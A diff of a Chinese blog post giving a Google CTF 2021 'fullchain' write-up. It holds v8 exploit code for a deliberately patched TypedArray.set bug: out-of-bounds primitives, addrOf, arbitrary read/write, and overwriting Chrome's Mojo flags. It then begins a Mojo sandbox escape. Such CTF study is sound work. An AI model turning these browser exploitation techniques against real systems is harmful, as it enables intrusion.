@@ -366,11 +366,10 @@
     <div class="post-body" itemprop="articleBody">
         <p>2021 google ctf 一道 pwn 题的复现，正如题目的名字，这是一条利用链，从 v8 到 sandbox-escape 再到 kernel pwn 提权</p>
 <span id="more"></span>
-<h2 id="环境搭建">环境搭建</h2>
-<p>官方附件：</p>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方附件：</p>
 <p><code>https://storage.googleapis.com/gctf-2021-attachments-project/c12856fc6c010d643763e678265f7921b7a44dcd7bcb5ced32634d21dfdff0c5f9542d6a5bdcc6639d8834ab1ff25b263affd8952b11e972c2066aa3cae71540</code></p>
-<p>官方题目源码：<code>https://github.com/google/google-ctf/tree/master/2021/quals/pwn-fullchain</code><br>
-(<em>环境很大，要搭建很久</em>)</p>
+<p>官方题目源码：<code>https://github.com/google/google-ctf/tree/master/2021/quals/pwn-fullchain</code><br>(<em>环境很大，要搭建很久</em>)</p>
 <p>远程环境：<code>fullchain.2021.ctfcompetition.com 1337</code></p>
 <p>chromium 的 commit 为：<code>1be58e78c7ec6603d416aed4dfae757334cd4e1e</code></p>
 <p>为了方便地调试 v8 的漏洞，需要搭建一下 v8 的环境，可以在下面的链接找到对应的 v8 commit ：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/chromium/src/+/1be58e78c7ec6603d416aed4dfae757334cd4e1e/DEPS">https://chromium.googlesource.com/chromium/src/+/1be58e78c7ec6603d416aed4dfae757334cd4e1e/DEPS</a></p>
@@ -378,12 +377,11 @@
 <pre class="line-numbers language-none"><code class="language-none">...
   &#39;v8_revision&#39;: &#39;0cf641358acebb26c2b7ddc047b1b41597d344c8&#39;,
 ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>搭建 v8 的调试环境即可</p>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p>题目要求输入一个 html 文件，交给 chrome 解析，flag 在 <code>/dev/vdb</code> 里，并且要 root 权限</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目要求输入一个 html 文件，交给 chrome 解析，flag 在 <code>/dev/vdb</code> 里，并且要 root 权限</p>
 <p>那么要从 chrome 任意代码执行，然后 kernel pwn 提权了</p>
-<h3 id="从-chrome-到任意代码执行">从 chrome 到任意代码执行</h3>
-<p>先来看看 chrome，题目用两个 patch 构造了两个 bug，分别对应 v8 和 Mojo</p>
+<h3 id="从-chrome-到任意代码执行"><a href="#从-chrome-到任意代码执行" class="headerlink" title="从 chrome 到任意代码执行"></a>从 chrome 到任意代码执行</h3><p>先来看看 chrome，题目用两个 patch 构造了两个 bug，分别对应 v8 和 Mojo</p>
 <p>v8_bug.patch：</p>
 <pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">diff --git a&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq b&#x2F;src&#x2F;builtins&#x2F;typed-array-set.tq
 index b5c9dcb261..ac5ebe9913 100644
@@ -410,6 +408,7 @@ index b5c9dcb261..ac5ebe9913 100644
    &#x2F;&#x2F; 12. Let targetName be the String value of target.[[TypedArrayName]].
    &#x2F;&#x2F; 13. Let targetType be the Element Type value in Table 62 for
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>这个 patch 很简单，把 TypedArray 的 set 方法的边界检查给去掉了</p>
 <p>set 方法是从指定索引开始给数组填充数据，没有了边界检查，那么就可以越界写了</p>
 <p>从越界写构造任意读写，那么就可以做很多事情了，当然了执行 shellcode 拿 shell 是不行的，因为 chrome 开启了 sandbox，v8 引擎的进程运行在 sandbox 中，很多系统调用如 execve 都无法使用，想要拿到 shell，就要利用接下来的 Mojo 的漏洞进行 sandbox-escape 了</p>
@@ -430,11 +429,10 @@ void CtfInterfaceImpl::Write(double value,
   numbers_[offset] &#x3D; value;
   std::move(callback).Run();
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>其中 numbers_ 成员是 std::vector 类，可以看到 Read 和 Write 方法都没有对索引进行越界检查，而且 std::vector 类对运算符 <code>[]</code> 的重载中，也是没有边界检查的，所以 Read 和 Write 可以任意越界读写，且 Mojo 的进程是不在 sandbox 里的，利用任意越界读写可以在 Mojo 的进程里执行 shellcode 就能拿到 shell</p>
-<h4 id="v8-exploit">v8 exploit</h4>
-<p>默认情况下，chrome 是不开启 Mojo 的功能的，需要添加相应的启动参数，但是 chrome 是有一些全局的 flags 控制运行时开启某些功能，开启 Mojo 的 flag 是 <code>is_mojo_js_enabled</code> 和 <code>is_mojo_js_test_enabled</code>，这两个是布尔类型的变量，通过 v8 的漏洞，将这两个变量改写为 true，重新加载页面即可开启 Mojo</p>
-<h5 id="从越界写到越界读写">从越界写到越界读写</h5>
-<p>调试以下代码：</p>
+<h4 id="v8-exploit"><a href="#v8-exploit" class="headerlink" title="v8 exploit"></a>v8 exploit</h4><p>默认情况下，chrome 是不开启 Mojo 的功能的，需要添加相应的启动参数，但是 chrome 是有一些全局的 flags 控制运行时开启某些功能，开启 Mojo 的 flag 是 <code>is_mojo_js_enabled</code> 和 <code>is_mojo_js_test_enabled</code>，这两个是布尔类型的变量，通过 v8 的漏洞，将这两个变量改写为 true，重新加载页面即可开启 Mojo</p>
+<h5 id="从越界写到越界读写"><a href="#从越界写到越界读写" class="headerlink" title="从越界写到越界读写"></a>从越界写到越界读写</h5><p>调试以下代码：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -442,22 +440,18 @@ void CtfInterfaceImpl::Write(double value,
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>oob_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可以看到数组 b 的 data_ptr 即数组的起始地址：<br>
-<img src="/images/68622871/0.png" alt="data_ptr"></p>
-<p>以及数组 oob_arr 的信息：<br>
-<img src="/images/68622871/1.png" alt="oob_arr"></p>
-<p>oob_arr 的长度为 4，因为 smi 用最低 bit 为 0 标记，那么 length 在内存中的值为 8，可以看到在如下地址处：<br>
-<img src="/images/68622871/2.png" alt="length"></p>
-<p>那么越界改写 oob_arr 的 length 字段，即可利用 oob_arr 造成任意越界读写，计算偏移如下：<br>
-<img src="/images/68622871/3.png" alt="offset_overwrite_length"></p>
+
+<p>可以看到数组 b 的 data_ptr 即数组的起始地址：<br><img src="/images/68622871/0.png" alt="data_ptr"></p>
+<p>以及数组 oob_arr 的信息：<br><img src="/images/68622871/1.png" alt="oob_arr"></p>
+<p>oob_arr 的长度为 4，因为 smi 用最低 bit 为 0 标记，那么 length 在内存中的值为 8，可以看到在如下地址处：<br><img src="/images/68622871/2.png" alt="length"></p>
+<p>那么越界改写 oob_arr 的 length 字段，即可利用 oob_arr 造成任意越界读写，计算偏移如下：<br><img src="/images/68622871/3.png" alt="offset_overwrite_length"></p>
 <p>那么只要 <code>b.set([fake_length], 32)</code>，即可达到改写 oob_arr 的 length 字段了，后续代码如下：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js">a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">444444</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 b<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>可以看到 length 字段成功被改写：<br>
-<img src="/images/68622871/4.png" alt="oob"></p>
-<h5 id="addrOf">addrOf</h5>
-<p>泄露地址的方式很简单，构造 Float 和 Object 的类型混淆就行，通过 Object 数组放入对象，再利用 oob_arr 越界把对象当作浮点数（也就是对象的地址）读出来即可：</p>
+
+<p>可以看到 length 字段成功被改写：<br><img src="/images/68622871/4.png" alt="oob"></p>
+<h5 id="addrOf"><a href="#addrOf" class="headerlink" title="addrOf"></a>addrOf</h5><p>泄露地址的方式很简单，构造 Float 和 Object 的类型混淆就行，通过 Object 数组放入对象，再利用 oob_arr 越界把对象当作浮点数（也就是对象的地址）读出来即可：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> oob_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -467,17 +461,17 @@ b<span class="token punctuation">.</span><span class="token function">set</span>
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>oob_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>obj_faker<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>调试看到 obj_faker 和 oob_arr 的信息：<br>
-<img src="/images/68622871/5.png" alt="obj_faker"></p>
+
+<p>调试看到 obj_faker 和 oob_arr 的信息：<br><img src="/images/68622871/5.png" alt="obj_faker"></p>
 <p><img src="/images/68622871/7.png" alt="oob_arr"></p>
-<p>计算偏移：<br>
-<img src="/images/68622871/8.png" alt="offset_addrOf"></p>
+<p>计算偏移：<br><img src="/images/68622871/8.png" alt="offset_addrOf"></p>
 <p><strong>注意：</strong> 因为 FixedDoubleArray 每个元素的大小是 8 字节，所以计算索引的时候是除以 8，而 FixedArray 每个元素都是对象的指针或者 smi （小整数），而且是 pointer compress （即指针压缩）的，占用 4 字节，所以 leak 出来的低 4 字节才是对象地址（压缩后的）</p>
 <p>根据偏移可以编写 addrOf 函数了：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">addrOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     obj_faker<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
     <span class="token keyword">return</span> oob_arr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">f2i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffn</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>为了方便浮点数和整数的转换还添加了下面的代码：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> conversion_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> float_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>conversion_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -493,8 +487,8 @@ b<span class="token punctuation">.</span><span class="token function">set</span>
     float_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> int_view<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="AAR-AAW">AAR/AAW</h5>
-<p>大多数情况下，可以利用 oob_arr 的越界写，改写 ArrayBuffer 的 backing_store 指针，来进行任意地址读写</p>
+
+<h5 id="AAR-AAW"><a href="#AAR-AAW" class="headerlink" title="AAR/AAW"></a>AAR/AAW</h5><p>大多数情况下，可以利用 oob_arr 的越界写，改写 ArrayBuffer 的 backing_store 指针，来进行任意地址读写</p>
 <p>不过这里参照 Hatena 师傅的 wp <a href="#Hatena_wp">#Hatena_wp</a>，可以利用 TypedArray 类似的字段进行任意地址读写，先看看下面代码：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -507,10 +501,9 @@ b<span class="token punctuation">.</span><span class="token function">set</span>
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>obj_faker<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>float_arr<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可以看到，data_ptr 由 base_pointer 和 external_pointer 组成：<br>
-<img src="/images/68622871/9.png" alt="TypedArray_data_ptr"></p>
-<p>可以发现 <strong>data_ptr = external_pointer + base_pointer</strong>，而且这个 external_pointer 含有完整指针的高 4 字节的地址，有了这个也可以得到对象的完整的 64 bit 的地址了<br>
-<img src="/images/68622871/10.png" alt="data_ptr_mem"></p>
+
+<p>可以看到，data_ptr 由 base_pointer 和 external_pointer 组成：<br><img src="/images/68622871/9.png" alt="TypedArray_data_ptr"></p>
+<p>可以发现 <strong>data_ptr = external_pointer + base_pointer</strong>，而且这个 external_pointer 含有完整指针的高 4 字节的地址，有了这个也可以得到对象的完整的 64 bit 的地址了<br><img src="/images/68622871/10.png" alt="data_ptr_mem"></p>
 <p>同样地计算偏移后即可构造处任意地址读写：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> old_28 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// external_pointer</span>
 <span class="token keyword">let</span> old_29 <span class="token operator">=</span> oob_arr<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// base_pointer</span>
@@ -532,8 +525,9 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
     float_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">i2f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="Enable-Mojo">Enable Mojo</h5>
-<p>有了任意地址读写和 leak 用的 addrOf，可以先泄露 chrome 的基地址</p>
+
+
+<h5 id="Enable-Mojo"><a href="#Enable-Mojo" class="headerlink" title="Enable Mojo"></a>Enable Mojo</h5><p>有了任意地址读写和 leak 用的 addrOf，可以先泄露 chrome 的基地址</p>
 <p>泄露 chrome 的基地址用到了 DOM 结点对象，这里使用 div ，在 +0xC 偏移处含有一个 chrome 段内的指针，计算可得 chrome 的地址：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> div_addr <span class="token operator">=</span> <span class="token function">addrOf</span><span class="token punctuation">(</span>div<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
@@ -541,7 +535,7 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 <span class="token keyword">let</span> chrome_base <span class="token operator">=</span> <span class="token function">arb_read</span><span class="token punctuation">(</span>r13 <span class="token operator">|</span> <span class="token punctuation">(</span>div_addr <span class="token operator">+</span> <span class="token number">0xCn</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x000000000c1bb7c0n</span><span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'chrome_base = '</span> <span class="token operator">+</span> chrome_base<span class="token punctuation">.</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>上面的偏移，只能先 leak 出来看看，然后查符号表看看低 12 bits 相同的有哪些一个个试了</p>
+<p>上面的偏移，只能先 leak 出来看看，然后查符号表看看低 12 bits 相同的有哪些一个个试了 </p>
 <p>最后改写 <code>is_mojo_js_enabled</code> 和 <code>is_mojo_js_test_enabled</code> 为 true（非 0 值）刷新页面：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> is_mojo_js_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0en</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> is_mojo_js_test_enabled <span class="token operator">=</span> chrome_base <span class="token operator">+</span> <span class="token number">0x000000000c560f0fn</span><span class="token punctuation">;</span>
@@ -553,10 +547,12 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'mojo enable!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>偏移可以通过查符号表获得：</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nm --demangle chromium/chrome <span class="token operator">|</span> <span class="token function">grep</span> is_mojo
 000000000c560f0e b blink::RuntimeEnabledFeaturesBase::is_mojo_js_enabled_
 000000000c560f0f b blink::RuntimeEnabledFeaturesBase::is_mojo_js_test_enabled_<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>因为刷新页面后，这个页面的 js 对象就要回收了，因为我们改写了 TypedArray 的两个指针，可能会在释放内存的时候 crash，所以需要恢复这两个指针再刷新：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     oob_arr<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> old_28<span class="token punctuation">;</span>
@@ -565,6 +561,7 @@ window<span class="token punctuation">.</span>location<span class="token punctua
 
 <span class="token function">cleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><em>实际上好像并不会 crash，应该和环境有关</em></p>
 <hr>
 <p>至此，完整的代码如下：</p>
@@ -674,8 +671,10 @@ window<span class="token punctuation">.</span>location<span class="token punctua
 
 <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="Sandbox-Escape">Sandbox Escape</h4>
-<p>刷新页面之后就开启了 Mojo，可以开始与 Mojo 交互了</p>
+
+
+
+<h4 id="Sandbox-Escape"><a href="#Sandbox-Escape" class="headerlink" title="Sandbox Escape"></a>Sandbox Escape</h4><p>刷新页面之后就开启了 Mojo，可以开始与 Mojo 交互了</p>
 <p>先写好与 CtfInterface 交互的函数：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">ctfRead</span><span class="token punctuation">(</span><span class="token parameter">ctf<span class="token punctuation">,</span> offset</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token keyword">let</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -709,15 +708,16 @@ window<span class="token punctuation">.</span>location<span class="token punctua
 
     <span class="token keyword">return</span> ctf<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>由于与 Mojo 的通信方式大多数是回调的方式（从 C++ 源码中也可以发现），基本都是异步的，为了方便，使用 async 的函数来写</p>
 <p>Mojo 与 v8 运行在不同的进程里，我们还要 leak 出 Mojo 所在进程的地址，才能在后续构造 ROP 拿 shell</p>
 <p>逆向可以发现 Ctf 对象存在如下结构：</p>
 <pre class="line-numbers language-none"><code class="language-none">+ 0x00 vtable_ptr
 + 0x08 vector_base
 + 0x10 vector_end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>只要通过越界写，更改 vtable_ptr 即可劫持虚表，从而劫持程序控制流，控制 <code>vector_base</code> 和 <code>vector_base</code> 字段还可以方便的进行任意地址的读写</p>
-<h5 id="find-Ctf-Object">find Ctf Object</h5>
-<p>由于 Mojo 对象的内存地址不稳定， 需要不断的分配对象，根据特征，直到找到为止：</p>
+<h5 id="find-Ctf-Object"><a href="#find-Ctf-Object" class="headerlink" title="find Ctf Object"></a>find Ctf Object</h5><p>由于 Mojo 对象的内存地址不稳定， 需要不断的分配对象，根据特征，直到找到为止：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> vec_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> vec_end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token keyword">let</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
@@ -761,8 +761,10 @@ console<span class="token punctuation">.</span><span class="token function">log<
         <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span> <span class="token comment">// for (let i = 4; i &lt; 0x1000; i++)</span>
 <span class="token punctuation">&#125;</span> <span class="token comment">// while (vec_base == 0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>同时得知了 Ctf 对象的虚表指针，可以计算得到程序的基址：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> chrome_base <span class="token operator">=</span> vtable <span class="token operator">-</span> <span class="token number">0xbc774e0n</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>然后还可以构造任意地址读写：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">arb_read</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
     <span class="token keyword">await</span> <span class="token function">ctfWrite</span><span class="token punctuation">(</span>ctf<span class="token punctuation">,</span> vtable_offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -787,9 +789,9 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
     <span class="token keyword">return</span> val<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>不过最终的 exp 中没有用到上面的任意地址读写的函数</p>
-<h5 id="ROP">ROP</h5>
-<p>为什么要使用 ROP，而不是利用上面的任意地址读写，来泄露 libc 地址再改 <code>__free_hook</code> 的方式呢？</p>
+<h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>为什么要使用 ROP，而不是利用上面的任意地址读写，来泄露 libc 地址再改 <code>__free_hook</code> 的方式呢？</p>
 <p>有多种原因：</p>
 <ol>
 <li>题目没有给 libc，泄露了 libc 地址，还得麻烦去查是上面版本的 libc</li>
@@ -804,8 +806,8 @@ $ gdb chromium/chrome
 <span class="token builtin class-name">set</span> follow-fork-mode parent
 b CtfInterfaceImpl::Read<span class="token punctuation">(</span>unsigned int, base::OnceCallback<span class="token operator">&lt;</span>void <span class="token punctuation">(</span>double<span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">)</span>
 r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可以发现调用方法的时候，rax 寄存器存的就是虚表的指针：<br>
-<img src="/images/68622871/11.png" alt="debug"></p>
+
+<p>可以发现调用方法的时候，rax 寄存器存的就是虚表的指针：<br><img src="/images/68622871/11.png" alt="debug"></p>
